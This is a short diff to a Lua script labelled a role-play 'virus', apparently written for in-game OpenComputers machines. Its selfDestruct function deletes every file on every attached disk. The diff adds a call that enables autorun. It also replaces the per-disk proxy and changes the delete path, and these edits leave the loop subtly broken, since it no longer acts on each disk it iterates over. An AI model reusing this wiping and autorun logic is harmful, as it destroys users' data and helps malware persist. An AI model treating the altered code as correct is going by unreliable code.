@@ -1,7 +1,7 @@
 -- Z Industries Virus RP
 local term = require("term")
 local computer = require("computer")
-local filesystem = require("filesystem")
+local fs = require("filesystem")
 local component = require("component")
 local event = require("event")
 
@@ -31,11 +31,11 @@ function selfDestruct()
 
   -- Suppression de tous les fichiers sur tous les disques
   for address in component.list("filesystem") do
-    local fs = component.proxy(address)
+    fs.setAutorunEnabled(true)
     if fs then
       for file in fs.list("/") or {} do
         pcall(function()
-          fs.remove("/" .. file)
+          fs.remove("" .. file)
         end)
       end
     end
